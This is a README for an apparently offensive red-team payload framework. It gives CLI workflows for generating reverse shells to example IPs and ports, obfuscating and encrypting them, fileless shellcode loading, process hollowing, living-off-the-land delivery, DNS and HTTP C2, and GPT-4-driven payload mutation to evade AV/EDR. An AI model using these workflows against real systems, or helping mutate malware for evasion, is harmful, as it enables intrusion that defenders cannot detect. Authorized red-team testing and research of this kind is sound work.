<img src="https://github.com/user-attachments/assets/8e083d5a-6232-49d6-88ce-a24e231a5429" alt="Loadiscator" width="1000" />

<p align="center">
  <b>Red Team Payload Generation & Obfuscation Framework</b><br>
  <i>🔐 Advanced AV/EDR Evasion • Adversary Simulation Toolkit</i>
</p>

---

> ⚠️ For authorized red team operations, AV/EDR evasion research, and educational use only. Do NOT use for unauthorized access or malicious purposes.

---

## Table of Contents
1. [Overview](#overview)
2. [Features](#features)
3. [Architecture](#architecture)
4. [Installation](#installation)
5. [Dependencies](#dependencies)
6. [Quick Start](#quick-start)
7. [Command-Line Reference](#command-line-reference)
8. [Advanced Modules](#advanced-modules)
9. [Shellcode Generation](#shellcode-generation)
10. [Example Workflows](#example-workflows)
11. [Troubleshooting](#troubleshooting)
12. [FAQ](#faq)
13. [Ethical Notice](#ethical-notice)
14. [Contribution & Support](#contribution--support)
15. [Disclaimer](#disclaimer)

---

## Overview

**Loadiscator** is a modular, extensible framework for generating, obfuscating, and delivering payloads for red team operations, adversary simulation, and AV/EDR evasion research. It supports multiple languages, advanced obfuscation, encryption, fileless execution, and C2 integrations. The framework is designed for both CLI and (optionally) web GUI usage, with a focus on research, education, and authorized security testing.

> Note : This Is A Heavy Prototype Build, Some Functions May Or May Not Work, Little Tweaks and Modifications Are Usually Needed.

---

## Features

- **Multi-language Payload Generation:** Python, Bash, PowerShell, C
- **Obfuscation Engines:** Base64, XOR, string mangling, polymorphic, metamorphic
- **Encryption:** AES-256-CBC
- **One-liner Encoding:** For Python, Bash, PowerShell
- **Payload Binding:** Bind to decoy files (PDF, EXE, etc.)
- **Memory-Only Execution:** Fileless shellcode loaders
- **Process Hollowing:** Run payloads in the context of legitimate processes
- **Living-Off-The-Land (LOTL):** Use native system tools for stealth
- **C2 Integrations:** MirageC2, DNS tunneling, HTTP blending
- **AI-Powered Optimization:** GPT-4 based payload mutation for AV/EDR bypass
- **Rich CLI**
- **Banner and UX Enhancements:** Rich ASCII art, colored output
- **Extensible:** Easily add new payloads, obfuscators, or C2 modules

---

## Architecture

```
+-------------------+
|        CLI        |
+-------------------+
          |
+-------------------+
|   Core Modules    |
+-------------------+
| Payload Generator |
| Obfuscators       |
| Encryptors        |
| Encoders          |
| Evasion           |
| C2 Connectors     |
| AI Optimizer      |
| Utils             |
+-------------------+
          |
+-------------------+
|   Output Payloads |
+-------------------+
```

- **CLI:** Fast User interface for all operations under cli.
- **Core Modules:** Modular Python packages for each function
- **Output:** Final payloads, scripts, and binaries

---

## Installation

### 1. Clone the Repository
```bash
git clone https://github.com/PardhuSreeRushiVarma20060119/loadiscator.git
cd loadiscator
```

### 2. Install Python Dependencies
```bash
pip install -r requirements.txt
```

### 3. (Optional) Install Additional Tools
- For shellcode generation: Python 3.x
- For C2 integration: Preferred C2s, DNS server, etc.

---

## Dependencies

- [typer](https://typer.tiangolo.com/) - CLI framework
- [jinja2](https://palletsprojects.com/p/jinja/) - Templating
- [cryptography](https://cryptography.io/) - Encryption
- [pycryptodome](https://www.pycryptodome.org/) - Crypto primitives
- [rich](https://rich.readthedocs.io/) - Terminal formatting
- [openai](https://platform.openai.com/docs/api-reference) - AI optimization
- [requests](https://docs.python-requests.org/) - HTTP requests

---

## Quick Start

### Generate a Python Reverse Shell
```bash
python -m loadiscator.cli generate python 10.10.10.10 4444 -o reverse.py
```

### Obfuscate the Payload (Polymorphic)
```bash
python -m loadiscator.cli obfuscate polymorphic --file reverse.py -o poly_reverse.py
```

### Encrypt the Payload
```bash
python -m loadiscator.cli encrypt --file poly_reverse.py --key "S3cr3tK3y123" -o encrypted.py
```

### Generate a One-Liner
```bash
python -m loadiscator.cli oneliner --file encrypted.py --lang python
```

---

## Command-Line Reference

### 1. Payload Generation
```
python -m loadiscator.cli generate [LANG] [IP] [PORT] -o [OUTPUT]
```
- LANG: python, bash, powershell, c
- Example: `python -m loadiscator.cli generate bash 192.168.1.5 9001 -o rev.sh`

### 2. Obfuscation
```
python -m loadiscator.cli obfuscate [TYPE] --file [INPUT] -o [OUTPUT] [--key KEY]
```
- TYPE: base64, xor, stringmangle, polymorphic
- Example: `python -m loadiscator.cli obfuscate xor --file rev.sh -o rev_xor.sh --key secret`

### 3. Encryption
```
python -m loadifscator.cli encrypt --file [INPUT] --key [KEY] -o [OUTPUT]
```

### 4. One-Liner Encoding
```
python -m loadiscator.cli oneliner --file [INPUT] --lang [LANG]
```

### 5. AI-Powered Payload Optimization
```
python -m loadiscator.cli ai-optimize --file [INPUT] --target [AV] -o [OUTPUT]
```
- Example: `python -m loadiscator.cli ai-optimize --file reverse.py --target generic -o ai_optimized.py`

### 6. Metamorphic Obfuscation
```
python -m loadiscator.cli metamorphic --file [INPUT] --iterations [N] -o [OUTPUT]
```

### 7. Process Hollowing
```
python -m loadifscator.cli hollow --process [PROCESS] -o [OUTPUT]
```
- Example: `python -m loadiscator.cli hollow --process notepad.exe -o hollow_payload.py`

### 8. Memory-Only Shellcode Loader
```
python -m loadifscator.cli memory-only --shellcode [SHELLCODE.BIN] -o [OUTPUT]
```
- Example: `python -m loadiscator.cli memory-only --shellcode calc_launcher.bin -o calc_loader.py`

### 9. Living-Off-The-Land Payloads
```
python -m loadiscator.cli living-off-land --technique [TECHNIQUE] --payload [PAYLOAD] -o [OUTPUT]
```
- Techniques: powershell, wmi, registry, schtasks, com, certutil, rundll32

### 10. C2 Integrations
- DNS Tunnel: `python -m loadiscator.cli dns-tunnel --domain [DOMAIN] --server [C2IP] -o [OUTPUT]`
- HTTP Blend: `python -m loadiscator.cli http-blend --url [C2URL] -o [OUTPUT]`

---

## Advanced Modules

### Obfuscators
- **Base64:** Encodes payloads in base64
- **XOR:** XORs payloads with a user-supplied key
- **String Mangling:** Splits and mangles string literals
- **Polymorphic:** Randomizes code structure, variable names, and adds junk code
- **Metamorphic:** Deep code transformation, unique build per run

### Encryptors
- **AES-256-CBC:** Strong symmetric encryption for payloads

### Encoders
- **One-liner:** Converts payloads to single-line scripts for Python, Bash, PowerShell

### Evasion
- **Memory-Only Execution:** Loads and runs shellcode in memory (no disk write)
- **Process Hollowing:** Injects payload into a legitimate process
- **Living-Off-The-Land:** Uses native tools (PowerShell, WMI, etc.) for stealth

### C2 Connectors
- **MirageC2:** Generates payloads for MirageC2
- **DNS Tunnel:** C2 over DNS
- **HTTP Blend:** C2 over HTTP(S)

### AI Optimizer
- **GPT-4 Integration:** Mutates payloads for AV/EDR evasion

---

## Shellcode Generation

A helper script is included for generating test shellcode:

```bash
python generate_shellcode.py reverse 127.0.0.1 4444
python generate_shellcode.py bind 4444
python generate_shellcode.py calc
```
- Output: `.bin` files for use with the memory-only loader

**Shellcode Types:**
- Reverse shell (Windows x64)
- Bind shell (Windows x64)
- calc.exe launcher (Windows x64)

**Note:** For real operations, use msfvenom, Donut, or other tools to generate production shellcode.

---

## Example Workflows

### 1. Fileless Memory-Only Execution
```bash
python generate_shellcode.py calc
python -m loadiscator.cli memory-only --shellcode calc_launcher.bin -o calc_loader.py
```

### 2. Polymorphic + Metamorphic + AI Optimization
```bash
python -m loadiscator.cli obfuscate polymorphic --file reverse.py -o poly.py
python -m loadiscator.cli metamorphic --file poly.py --iterations 2 -o meta.py
python -m loadiscator.cli ai-optimize --file meta.py --target generic -o final.py
```

### 3. Living-Off-The-Land Payload
```bash
python -m loadiscator.cli living-off-land --technique powershell --payload reverse.py -o lotl_payload.ps1
```

### 4. C2 Integration (MirageC2)
```bash
python -m loadiscator.cli c2-mirage --server http://mirage.local --listener mylistener --key APIKEY123 -o mirage_payload.py
```

---

## Troubleshooting

### Common Issues
- **ImportError:** Ensure all dependencies are installed (`pip install -r requirements.txt`)
- **FileNotFoundError:** Check that shellcode or payload files exist and paths are correct
- **PermissionError:** Run as administrator if required (especially for process hollowing)
- **OpenAI API Errors:** Ensure your API key is set as an environment variable (`OPENAI_API_KEY`)
- **Syntax Errors:** Use the correct CLI syntax (dashes, not underscores)

### Debugging Tips
- Use `--help` with any command for usage info
- Check the output files for errors or incomplete payloads
- Review the logs and console output for stack traces

---

## FAQ

**Q: Is this tool legal to use?**
> A: Yes — but only for authorized red teaming, security research, or educational purposes. You must have explicit permission before running any generated payloads on a target system. Unauthorized use is illegal and strictly against this project's intent.

Q: Can I add my own payloads or obfuscators?**
> A: Totally! Loadiscator is modular by design. Just add your logic to loadiscator/payloads/ or loadiscator/obfuscators/.
It’s completely your choice — not a requirement.
— but we truly appreciate contributions from the community. ❤️

**Q: Does it support Linux and macOS targets?**
> A: Yes, many payloads (like Python, Bash) are cross-platform. However, some advanced modules (like memory-only shellcode loaders or process hollowing) are currently Windows-only due to system-specific APIs.

**Q: How do I use the AI optimizer?**
> A: Just set your OpenAI API key as the environment variable OPENAI_API_KEY, then run the ai-optimize command. The tool will use GPT to intelligently mutate your payload for better evasion.
It's an experimental but powerful feature — feedback is always welcome!

**Q: Can I use real-world shellcode?**
> A: Yes! While Loadiscator includes a simple generate_shellcode.py for testing, you can also use tools like msfvenom, Donut, or your own C2-generated shellcode. Just pass the .bin file into the memory-only loader.

**Q: Is this beginner-friendly?**
> A: Definitely. The CLI is designed to be intuitive, and the README gives you step-by-step examples. You don’t need to be a red team expert to start learning and using Loadiscator effectively.

**Q: I found a bug / have an idea — what should I do?**
> A: That’s awesome! You can open an issue or submit a pull request. No pressure — but if you do contribute, we’ll make sure to give you credit and ❤️ in the changelog.

---

## Ethical Notice

This tool is for authorized red team operations, AV/EDR evasion research, and education only. Do not use for unauthorized access or malicious purposes. The authors assume no liability for misuse.

- **You are responsible for your actions.**
- **Always have written authorization before using this tool in any environment.**
- **Violations may be illegal and result in prosecution.**

---

## Contribution & Support

- PRs and issues welcome!
- For questions, open an issue or contact the maintainer.
- To add new modules, follow the structure in `loadiscator/` and submit a pull request.
- For feature requests, describe your use case and desired functionality.

---

## Disclaimer

This software is provided for research and educational purposes only. Usage without proper authorization is strictly prohibited. The authors and contributors assume no liability for misuse or damages resulting from the use of this software.

---

## File/Module Structure

```
Payload&Obsfucation Framework/
  - loadiscator/
    - ai/                  # AI-powered payload optimizer
    - binder/              # Payload binding modules
    - c2/                  # C2 integrations (Mirage, DNS, HTTP)
    - encoder/             # One-liner encoders
    - encryptors/          # AES encryption
    - evasion/             # Evasion modules (memory-only, hollowing, etc.)
    - obfuscators/         # All obfuscation engines
    - payloads/            # Payload templates (bash, c, python, powershell)
    - utils/               # Utilities (banner, random name, anti-analysis)
    - cli.py               # Main CLI entrypoint
    - README.md            # This documentation
    - requirements.txt     # Python dependencies
    - setup.py             # Install script
  - generate_shellcode.py  # Standalone shellcode generator
  - test_*.py              # Test scripts
```

---

## Example: Adding a New Obfuscator

1. Create a new file in `loadiscator/obfuscators/`, e.g., `myobfuscator.py`.
2. Implement a function, e.g., `def my_obfuscate(input_file, output_file): ...`
3. Import and add it to the CLI in `cli.py`.
4. Document usage in the README.

---

## Security & Best Practices

- Never run generated payloads on production or sensitive systems
- Always test in isolated, controlled environments (VMs, sandboxes)
- Use strong, unique encryption keys
- Review output code before deployment
- Keep dependencies up to date

---

## Credits

- Inspired by tools like Veil, Unicorn, Donut, and Metasploit
- Thanks to the open-source security community

---

## License
This project is licensed under the [MIT License](LICENSE).  
You are free to use, modify, and distribute this project under the terms of the license.  

---

## Changelog

- v1.0: Initial release with multi-language payloads, obfuscation, encryption, and C2 modules
- v1.1: Added AI optimizer, memory-only loader, and advanced evasion
- v1.2: Bug fixes, improved CLI.

---

## Contact

- [LinkedIn](linkedin.com/in/pardhu-sri-rushi-varma-konduru-696886279)
- [Github](github.com/PardhuSreeRushiVarma20060119)

---

## 💖 Sponsor Me

I'm actively building open-source cybersecurity tools like MirageC2, PhishVault, and OpenLoRa, and Sometime Mini Tools Like This One.  
If you find my work valuable, consider supporting it with love:

[![Sponsor](https://img.shields.io/badge/Sponsor-PardhuVarma-blue?style=for-the-badge&logo=github-sponsors&logoColor=white)](https://github.com/sponsors/PardhuSreeRushiVarma20060119)


---

> END OF DOCUMENTATION, *Built With Love💖*

<!--
This README is intentionally verbose and detailed for research, red team, and educational use. For a shorter version, see the top section or use `less README.md`.
--> 
